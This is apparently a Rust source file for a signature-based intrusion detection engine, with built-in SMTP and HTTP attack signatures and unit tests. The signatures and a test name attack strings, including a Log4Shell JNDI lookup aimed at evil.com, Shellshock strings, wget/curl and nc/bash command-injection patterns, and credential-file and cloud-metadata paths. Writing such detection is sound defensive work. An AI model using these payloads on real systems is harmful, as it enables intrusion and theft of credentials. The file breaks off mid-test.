//! Signature-based detection engine
//!
//! Compiles attack signatures into an Aho-Corasick automaton for O(n)
//! multi-pattern scanning of packet payloads.

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};
use serde::{Deserialize, Serialize};

/// Action to take when a signature matches
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum SignatureAction {
    /// Generate alert only
    Alert,
    /// Drop the packet/connection
    Drop,
    /// Send TCP RST / ICMP unreachable
    Reject,
    /// Pass (explicitly allow, used for exceptions)
    Pass,
}

/// Severity level
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum SigSeverity {
    /// Informational
    Info = 1,
    /// Low severity
    Low = 2,
    /// Medium severity
    Medium = 3,
    /// High severity
    High = 4,
    /// Critical
    Critical = 5,
}

/// A single IDS signature
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Signature {
    /// Signature ID (SID)
    pub sid: u32,
    /// Revision
    pub rev: u32,
    /// Human-readable message
    pub message: String,
    /// Content patterns to match (all must be present; binary byte sequences supported)
    pub content_patterns: Vec<Vec<u8>>,
    /// Optional PCRE-style regex patterns.
    ///
    /// When present, **at least one** regex must match for the signature to fire
    /// (in addition to all `content_patterns` being present). This allows
    /// flexible matching of polymorphic or encoded payloads that static
    /// Aho-Corasick patterns cannot capture.
    #[serde(default)]
    pub regex_patterns: Vec<String>,
    /// Action on match
    pub action: SignatureAction,
    /// Severity
    pub severity: SigSeverity,
    /// Category (e.g., "exploit", "malware", "policy-violation")
    pub category: String,
    /// Protocol filter (tcp, udp, smtp, http, any)
    pub protocol: String,
    /// CVE references
    pub references: Vec<String>,
}

/// Compiled signature set with Aho-Corasick automaton
pub struct SignatureSet {
    /// The compiled automaton
    automaton: Option<AhoCorasick>,
    /// Pattern index -> signature mapping
    pattern_to_sig: Vec<usize>,
    /// All signatures
    signatures: Vec<Signature>,
    /// Compiled regex patterns per signature (indexed by signature index).
    /// Each entry contains the compiled regexes for that signature's `regex_patterns`.
    compiled_regexes: Vec<Vec<regex::bytes::Regex>>,
}

impl SignatureSet {
    /// Create a new signature set from a list of signatures
    pub fn new(signatures: Vec<Signature>) -> Result<Self, String> {
        if signatures.is_empty() {
            return Ok(Self {
                automaton: None,
                pattern_to_sig: Vec::new(),
                signatures,
                compiled_regexes: Vec::new(),
            });
        }

        let mut all_patterns = Vec::new();
        let mut pattern_to_sig = Vec::new();

        // Compile per-signature regex patterns
        let mut compiled_regexes = Vec::with_capacity(signatures.len());
        for (sig_idx, sig) in signatures.iter().enumerate() {
            for pattern in &sig.content_patterns {
                all_patterns.push(pattern.clone());
                pattern_to_sig.push(sig_idx);
            }

            let mut regexes = Vec::with_capacity(sig.regex_patterns.len());
            for pat in &sig.regex_patterns {
                let re = regex::bytes::RegexBuilder::new(pat)
                    .case_insensitive(true)
                    .dot_matches_new_line(true)
                    .size_limit(1 << 20) // 1 MB compiled DFA limit
                    .build()
                    .map_err(|e| format!("SID {} regex compile error: {}", sig.sid, e))?;
                regexes.push(re);
            }
            compiled_regexes.push(regexes);
        }

        let automaton = AhoCorasickBuilder::new()
            .match_kind(MatchKind::LeftmostFirst)
            .ascii_case_insensitive(true)
            .build(&all_patterns)
            .map_err(|e| format!("Failed to build automaton: {}", e))?;

        Ok(Self {
            automaton: Some(automaton),
            pattern_to_sig,
            signatures,
            compiled_regexes,
        })
    }

    /// Scan a payload against all signatures.
    /// Returns matched signature indices.
    ///
    /// Matching logic:
    /// - If a signature has **only** `content_patterns`: Aho-Corasick hit fires it.
    /// - If a signature has **only** `regex_patterns`: at least one regex must match.
    /// - If both are specified: AC hit required AND at least one regex must match.
    pub fn scan(&self, payload: &[u8]) -> Vec<ScanMatch> {
        let mut matched_sigs = std::collections::HashSet::new();
        let mut results = Vec::new();

        // Phase 1: find AC content-pattern matches
        let mut ac_matched_sigs = std::collections::HashSet::new();
        if let Some(automaton) = &self.automaton {
            for mat in automaton.find_iter(payload) {
                let sig_idx = self.pattern_to_sig[mat.pattern().as_usize()];
                ac_matched_sigs.insert(sig_idx);
            }
        }

        // Phase 2: evaluate each signature
        for (sig_idx, sig) in self.signatures.iter().enumerate() {
            let has_content = !sig.content_patterns.is_empty();
            let has_regex = !sig.regex_patterns.is_empty();
            let ac_hit = ac_matched_sigs.contains(&sig_idx);

            let fires = match (has_content, has_regex) {
                (true, true) => {
                    // Both required: AC must hit AND at least one regex must match
                    ac_hit && self.any_regex_match(sig_idx, payload)
                }
                (true, false) => {
                    // Content-only: AC hit suffices
                    ac_hit
                }
                (false, true) => {
                    // Regex-only: at least one regex must match
                    self.any_regex_match(sig_idx, payload)
                }
                (false, false) => {
                    // No patterns at all — never fires on payload scan
                    false
                }
            };

            if fires && matched_sigs.insert(sig_idx) {
                results.push(ScanMatch {
                    sid: sig.sid,
                    message: sig.message.clone(),
                    action: sig.action,
                    severity: sig.severity,
                    category: sig.category.clone(),
                    offset: 0,
                });
            }
        }

        results
    }

    /// Check whether at least one compiled regex for the given signature matches.
    fn any_regex_match(&self, sig_idx: usize, payload: &[u8]) -> bool {
        self.compiled_regexes
            .get(sig_idx)
            .map(|regexes| regexes.iter().any(|re| re.is_match(payload)))
            .unwrap_or(false)
    }

    /// Number of loaded signatures
    pub fn signature_count(&self) -> usize {
        self.signatures.len()
    }
}

/// Result of a signature scan match
#[derive(Debug, Clone)]
pub struct ScanMatch {
    /// Signature ID
    pub sid: u32,
    /// Alert message
    pub message: String,
    /// Action
    pub action: SignatureAction,
    /// Severity
    pub severity: SigSeverity,
    /// Category
    pub category: String,
    /// Byte offset where first match occurred
    pub offset: usize,
}

/// Built-in signatures for common SMTP and mail-server attacks.
///
/// Design notes:
/// - SID 2000001 was removed: "EHLO " fires on every legitimate SMTP connection,
///   causing alert fatigue. Buffer-overflow detection is handled by protocol_analyzer
///   checking line lengths (>512 bytes per RFC 5321).
/// - NOP sled pattern uses actual 0x90 bytes, NOT the string literal `\\x90`.
pub fn builtin_mail_signatures() -> Vec<Signature> {
    vec![
        Signature {
            sid: 2000002,
            rev: 2,
            message: "SMTP: NOP-sled shellcode detected in mail body".into(),
            // FIXED: actual 0x90 bytes stored as Vec<u8>, not a String literal
            content_patterns: vec![b"\x90\x90\x90\x90\x90\x90\x90\x90".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "exploit".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000003,
            rev: 1,
            message: "SMTP: VRFY command enumeration".into(),
            content_patterns: vec![b"VRFY ".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "reconnaissance".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000004,
            rev: 1,
            message: "SMTP: EXPN command enumeration".into(),
            content_patterns: vec![b"EXPN ".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "reconnaissance".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000010,
            rev: 1,
            message: "HTTP: /etc/passwd access attempt".into(),
            content_patterns: vec![b"/etc/passwd".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000011,
            rev: 1,
            message: "HTTP: .env file access attempt".into(),
            content_patterns: vec![b"/.env".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000012,
            rev: 1,
            message: "HTTP: Log4Shell JNDI injection attempt (CVE-2021-44228)".into(),
            content_patterns: vec![b"${jndi:".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec!["CVE-2021-44228".into()],
            regex_patterns: vec![],
        },
        Signature {
            // Obfuscated Log4Shell variants break the ${jndi: prefix across nested
            // lookups (e.g. ${j${::-n}di:ldap://evil.com/x}) but the JNDI protocol
            // URL still appears in cleartext. Detecting jndi:<proto>:// catches
            // most obfuscated payloads regardless of how the prefix is mangled.
            sid: 2000017,
            rev: 1,
            message: "HTTP: Log4Shell obfuscated JNDI protocol URL (CVE-2021-44228)".into(),
            content_patterns: vec![
                b"jndi:ldap://".to_vec(),
                b"jndi:ldaps://".to_vec(),
                b"jndi:rmi://".to_vec(),
                b"jndi:dns://".to_vec(),
                b"jndi:iiop://".to_vec(),
                b"jndi:corba://".to_vec(),
            ],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec!["CVE-2021-44228".into()],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000013,
            rev: 1,
            message: "HTTP: Spring4Shell exploitation pattern (CVE-2022-22965)".into(),
            content_patterns: vec![b"class.module.classLoader".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec!["CVE-2022-22965".into()],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000014,
            rev: 1,
            message: "HTTP: .git directory exposure attempt".into(),
            content_patterns: vec![b"/.git/".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000015,
            rev: 1,
            message: "HTTP: PHP remote file include (RFI) attempt".into(),
            content_patterns: vec![b"php://input".to_vec(), b"php://filter".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "rfi".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000016,
            rev: 1,
            message: "HTTP: Server-side template injection (SSTI) pattern".into(),
            content_patterns: vec![b"{{7*7}}".to_vec(), b"{{config}}".to_vec(), b"${7*7}".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::High,
            category: "ssti".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000020,
            rev: 1,
            message: "DNS: Oversized query (possible amplification)".into(),
            content_patterns: vec![],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "dos".into(),
            protocol: "dns".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000030,
            rev: 1,
            message: "TLS: SSLv2/SSLv3 handshake (insecure protocol)".into(),
            content_patterns: vec![],
            action: SignatureAction::Alert,
            severity: SigSeverity::High,
            category: "policy-violation".into(),
            protocol: "tls".into(),
            references: vec!["CVE-2014-3566".into()],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000040,
            rev: 1,
            message: "SMTP: AUTH PLAIN credential brute-force pattern".into(),
            content_patterns: vec![b"AUTH PLAIN ".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Low,
            category: "brute-force".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000041,
            rev: 1,
            message: "SMTP: Suspicious RCPT TO bulk recipient (possible spam relay probe)".into(),
            content_patterns: vec![b"RCPT TO:<postmaster@".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Low,
            category: "spam".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        // ── Additional signatures from security audit recommendations ──
        Signature {
            sid: 2000050,
            rev: 1,
            message: "HTTP: Shellshock CGI exploitation attempt (CVE-2014-6271)".into(),
            content_patterns: vec![
                b"() { :; };".to_vec(),
                b"() { :;}; ".to_vec(),
                b"() { ignored;};".to_vec(),
            ],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec!["CVE-2014-6271".into(), "CVE-2014-7169".into()],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000051,
            rev: 1,
            message: "HTTP: HTTP/2 SETTINGS flood (Rapid Reset pattern, CVE-2023-44487)".into(),
            content_patterns: vec![
                b"RST_STREAM".to_vec(),
            ],
            action: SignatureAction::Alert,
            severity: SigSeverity::High,
            category: "dos".into(),
            protocol: "http".into(),
            references: vec!["CVE-2023-44487".into()],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000052,
            rev: 1,
            message: "HTTP: ProxyShell SSRF exploitation (CVE-2021-34473)".into(),
            content_patterns: vec![
                b"/autodiscover/autodiscover.json".to_vec(),
                b"/mapi/nspi/".to_vec(),
            ],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec!["CVE-2021-34473".into(), "CVE-2021-34523".into(), "CVE-2021-31207".into()],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000053,
            rev: 1,
            message: "HTTP: ProxyLogon exploitation attempt (CVE-2021-26855)".into(),
            content_patterns: vec![
                b"/ecp/".to_vec(),
                b"X-BEResource".to_vec(),
            ],
            action: SignatureAction::Alert,
            severity: SigSeverity::High,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec!["CVE-2021-26855".into()],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000054,
            rev: 1,
            message: "SMTP: AUTH credential stuffing rate pattern".into(),
            content_patterns: vec![b"AUTH LOGIN".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "brute-force".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000055,
            rev: 1,
            message: "HTTP: Server-side request forgery via cloud metadata endpoint".into(),
            content_patterns: vec![
                b"169.254.169.254".to_vec(),
                b"metadata.google.internal".to_vec(),
            ],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "ssrf".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000056,
            rev: 1,
            message: "HTTP: Known ransomware C2 beacon pattern (Cobalt Strike)".into(),
            content_patterns: vec![
                b"/pixel.gif".to_vec(),
                b"/submit.php?id=".to_vec(),
                b"/__utm.gif".to_vec(),
            ],
            action: SignatureAction::Alert,
            severity: SigSeverity::High,
            category: "c2".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000057,
            rev: 1,
            message: "SMTP: DATA content smuggling via premature dot-stuffing".into(),
            content_patterns: vec![
                b"\r\n.\r\nMAIL FROM:".to_vec(),
                b"\n.\nMAIL FROM:".to_vec(),
            ],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "smuggling".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000058,
            rev: 1,
            message: "SMTP: PIPELINING abuse — multiple commands in single packet".into(),
            content_patterns: vec![
                b"\r\nMAIL FROM:".to_vec(),
            ],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "policy-violation".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000060,
            rev: 1,
            message: "SMTP: CHUNKING/BDAT abuse pattern".into(),
            content_patterns: vec![b"BDAT ".to_vec(), b"CHUNKING".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "protocol-abuse".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000061,
            rev: 1,
            message: "SMTP: STARTTLS stripping attempt".into(),
            content_patterns: vec![b"250-STARTTLS".to_vec(), b"STARTTLS not available".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::High,
            category: "tls-downgrade".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000062,
            rev: 1,
            message: "SMTP: AUTH PLAIN with suspicious NULL-delimited payload".into(),
            content_patterns: vec![b"AUTH PLAIN \x00".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "auth-abuse".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000064,
            rev: 1,
            message: "SMTP: Null sender combined with suspicious recipient probing".into(),
            content_patterns: vec![b"MAIL FROM:<>\r\nRCPT TO:<".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Low,
            category: "spam".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000065,
            rev: 1,
            message: "SMTP: Bare LF command termination attempt".into(),
            content_patterns: vec![b"\nMAIL FROM:".to_vec(), b"\nRCPT TO:".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "smuggling".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000066,
            rev: 1,
            message: "SMTP: MIME boundary mismatch indicator".into(),
            content_patterns: vec![
                b"Content-Type: multipart/".to_vec(),
                b"boundary=\"----".to_vec(),
                b"boundary='----".to_vec(),
            ],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "mime-anomaly".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000067,
            rev: 1,
            message: "SMTP: ARC seal replay or invalid chain marker".into(),
            content_patterns: vec![b"ARC-Seal:".to_vec(), b"cv=fail".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "auth-anomaly".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000068,
            rev: 1,
            message: "SMTP: DKIM replay indicator with stale signature timestamp".into(),
            content_patterns: vec![
                b"DKIM-Signature:".to_vec(),
                b" x=0".to_vec(),
                b" x=1".to_vec(),
            ],
            action: SignatureAction::Alert,
            severity: SigSeverity::Low,
            category: "auth-anomaly".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000069,
            rev: 1,
            message: "HTTP: Serialized Java gadget payload marker".into(),
            content_patterns: vec![b"rO0AB".to_vec(), b"java.lang".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "deserialization".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000070,
            rev: 1,
            message: "HTTP: XML external entity (XXE) payload".into(),
            content_patterns: vec![b"<!DOCTYPE".to_vec(), b"<!ENTITY".to_vec(), b"SYSTEM".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "xxe".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000071,
            rev: 1,
            message: "HTTP: Attempt to access cloud credential file".into(),
            content_patterns: vec![b"/.aws/credentials".to_vec(), b"/root/.ssh/".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "exfiltration".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000072,
            rev: 1,
            message: "HTTP: Suspicious command-execution probe parameters".into(),
            content_patterns: vec![b"cmd=".to_vec(), b";wget ".to_vec(), b";curl ".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "rce".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000073,
            rev: 1,
            message: "HTTP: Path traversal via encoded dot-dot slash".into(),
            content_patterns: vec![b"%2e%2e%2f".to_vec(), b"%252e%252e%252f".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "traversal".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000074,
            rev: 1,
            message: "HTTP: Common admin endpoint brute-force probe".into(),
            content_patterns: vec![b"/wp-login.php".to_vec(), b"/admin/login".to_vec(), b"/administrator".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "reconnaissance".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000075,
            rev: 1,
            message: "HTTP: Suspicious script execution in user-supplied fields".into(),
            content_patterns: vec![b"<script".to_vec(), b"onerror=".to_vec(), b"javascript:".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::High,
            category: "xss".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000076,
            rev: 1,
            message: "HTTP: SQLMap user-agent fingerprint".into(),
            content_patterns: vec![b"sqlmap".to_vec(), b"sqlmap/".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "reconnaissance".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000077,
            rev: 1,
            message: "HTTP: Nikto scanner fingerprint".into(),
            content_patterns: vec![b"Nikto".to_vec(), b"nikto".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Low,
            category: "reconnaissance".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000078,
            rev: 1,
            message: "HTTP: Nmap scripting engine probe".into(),
            content_patterns: vec![b"Nmap Scripting Engine".to_vec(), b"NSE".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Low,
            category: "reconnaissance".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000079,
            rev: 1,
            message: "SMTP: Suspicious executable attachment filename".into(),
            content_patterns: vec![
                b"filename=\"invoice.pdf.exe\"".to_vec(),
                b"filename=\"update.scr\"".to_vec(),
                b"filename=\"document.js\"".to_vec(),
            ],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "malware".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000080,
            rev: 1,
            message: "SMTP: Dangerous archive attachment indicator".into(),
            content_patterns: vec![
                b"filename=\"archive.7z\"".to_vec(),
                b"filename=\"disk.iso\"".to_vec(),
                b"filename=\"payload.img\"".to_vec(),
            ],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "malware".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000081,
            rev: 1,
            message: "SMTP: Encoded script payload in body".into(),
            content_patterns: vec![b"Content-Transfer-Encoding: base64".to_vec(), b"powershell".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::High,
            category: "malware".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000082,
            rev: 1,
            message: "SMTP: URL shortener phishing lure in message body".into(),
            content_patterns: vec![b"bit.ly/".to_vec(), b"tinyurl.com/".to_vec(), b"t.co/".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "phishing".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        Signature {
            sid: 2000083,
            rev: 1,
            message: "HTTP: Suspicious metadata token header exfiltration".into(),
            content_patterns: vec![b"Metadata-Flavor: Google".to_vec(), b"X-aws-ec2-metadata-token".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "ssrf".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![],
        },
        // ── Regex-based signatures (PCRE support) ──
        Signature {
            sid: 2000090,
            rev: 1,
            message: "HTTP: Obfuscated Log4Shell with nested lookups (CVE-2021-44228)".into(),
            content_patterns: vec![],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec!["CVE-2021-44228".into()],
            regex_patterns: vec![
                // ${j${::-n}di:ldap://...} and similar nested obfuscations
                r#"\$\{[^\}]*j[^\}]*n[^\}]*d[^\}]*i[^\}]*:[^\}]*//[^\}]*\}"#.into(),
            ],
        },
        Signature {
            sid: 2000091,
            rev: 1,
            message: "HTTP: SQL injection with UNION SELECT (multi-variant)".into(),
            content_patterns: vec![],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "sqli".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![
                r#"(?i)union\s+(all\s+)?select\s+"#.into(),
                r#"(?i)(?:;|\))\s*select\s+.*\sfrom\s+"#.into(),
            ],
        },
        Signature {
            sid: 2000092,
            rev: 1,
            message: "HTTP: OS command injection via shell metacharacters".into(),
            content_patterns: vec![],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "rce".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![
                r#"(?:;|\||\$\(|`)\s*(?:cat|ls|id|whoami|uname|wget|curl|nc|bash|sh|python|perl|ruby|php)\b"#.into(),
            ],
        },
        Signature {
            sid: 2000093,
            rev: 1,
            message: "SMTP: Base64-encoded PowerShell payload in attachment".into(),
            content_patterns: vec![b"Content-Transfer-Encoding: base64".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::High,
            category: "malware".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![
                // Base64 of common PowerShell invocations
                r#"(?:cG93ZXJzaGVsbA|UG93ZXJTaGVsbA|SQBuAHYAbwBrAGUALQA)"#.into(),
            ],
        },
        Signature {
            sid: 2000094,
            rev: 1,
            message: "HTTP: Path traversal via encoded or double-encoded sequences".into(),
            content_patterns: vec![],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "traversal".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![
                r#"(?:%(?:25)?2[eE]){2}[/\\%]"#.into(),
                r#"(?:\.\./|\.\.\\){3,}"#.into(),
            ],
        },
        Signature {
            sid: 2000095,
            rev: 1,
            message: "HTTP: XSS via event handler with obfuscation".into(),
            content_patterns: vec![],
            action: SignatureAction::Alert,
            severity: SigSeverity::High,
            category: "xss".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![
                // Matches on<event>= patterns with various obfuscation
                r#"(?i)\bon(?:error|load|click|mouseover|focus|blur|input|change)\s*="#.into(),
                r#"(?i)<(?:script|img|svg|iframe|body|object|embed|details|video|audio)\b[^>]*\bon\w+\s*="#.into(),
            ],
        },
        Signature {
            sid: 2000096,
            rev: 1,
            message: "SMTP: Suspicious double extension attachment".into(),
            content_patterns: vec![],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "malware".into(),
            protocol: "smtp".into(),
            references: vec![],
            regex_patterns: vec![
                // filename="report.pdf.exe" or similar double-extension tricks
                r#"filename\s*=\s*"[^"]+\.(?:pdf|doc|xls|ppt|jpg|png|gif)\.\w{2,4}""#.into(),
            ],
        },
        Signature {
            sid: 2000097,
            rev: 1,
            message: "HTTP: Server-side request forgery via URL parameter".into(),
            content_patterns: vec![],
            action: SignatureAction::Alert,
            severity: SigSeverity::High,
            category: "ssrf".into(),
            protocol: "http".into(),
            references: vec![],
            regex_patterns: vec![
                r#"(?:url|redirect|next|target|link|goto|return)\s*=\s*https?://(?:localhost|127\.|10\.|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168\.)"#.into(),
            ],
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_signature_matching() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        // VRFY is a recon technique; must match
        let payload = b"VRFY admin\r\n";
        let matches = set.scan(payload);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].sid, 2000003);
    }

    #[test]
    fn test_nop_sled_detects_actual_bytes() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        // Must match the ACTUAL 0x90 byte sequence, NOT the ASCII literal string
        let payload: &[u8] = &[
            b'D', b'A', b'T', b'A', b'\r', b'\n',
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        ];
        let matches = set.scan(payload);
        assert!(!matches.is_empty(), "NOP sled must be detected in binary payload");
        assert!(matches.iter().any(|m| m.sid == 2000002), "Expected SID 2000002");
    }

    #[test]
    fn test_nop_sled_does_not_trigger_on_literal_string() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        // The old broken pattern matched THIS text string — not real 0x90 bytes
        let payload = b"\\x90\\x90\\x90\\x90 (this is just the text literal)";
        let matches = set.scan(payload);
        // This text payload has NO actual 0x90 bytes — should NOT match NOP sled sig
        assert!(!matches.iter().any(|m| m.sid == 2000002),
            "Text backslash-x90 must NOT trigger the binary NOP sled signature");
    }

    #[test]
    fn test_log4shell_detection() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"GET /?q=${jndi:ldap://evil.com/x} HTTP/1.1\r\n";
        let matches = set.scan(payload);
        assert!(!matches.is_empty(), "Log4Shell pattern must be detected");
        assert!(matches.iter().any(|m| m.sid == 2000012));
    }

    #[test]
    fn test_ehlo_not_false_positive() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        // Normal legitimate EHLO must NOT fire (old SID 2000001 was removed)
        let payload = b"EHLO mail.example.com\r\n";
        let matches = set.scan(payload);
        assert!(!matches.iter().any(|m| m.sid == 2000001),
            "Normal EHLO greeting must NOT generate a false-positive alert");
    }

    #[test]
    fn test_no_match() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"HELO normal.host.com\r\n";
        let matches = set.scan(payload);
